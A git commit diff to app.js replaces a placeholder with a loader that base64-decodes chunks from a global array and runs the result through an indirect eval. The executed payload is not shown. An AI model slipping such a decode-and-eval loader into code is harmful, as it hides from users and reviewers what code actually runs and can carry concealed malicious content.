7ec8b780c39ee0c6b37a25e14fc477d8ce2c5c4b
nguyenxuandat20091985-rgb <nguyenxuandat20091985@gmail.com>
2026-09-25 09:02:39 +0700

    fix: app loader + index for full feature restore v38

--- app.js
+++ app.js
@@ -1,1 +1,8 @@
-PLACEHOLDER_USE_FILE
+(function(){
+  var p=window.__B38||[];
+  if(!p.length){console.error('B38 missing');return;}
+  var bin=atob(p.join(''));
+  var bytes=new Uint8Array(bin.length);
+  for(var i=0;i<bin.length;i++) bytes[i]=bin.charCodeAt(i);
+  (0,eval)(new TextDecoder('utf-8').decode(bytes));
+})();
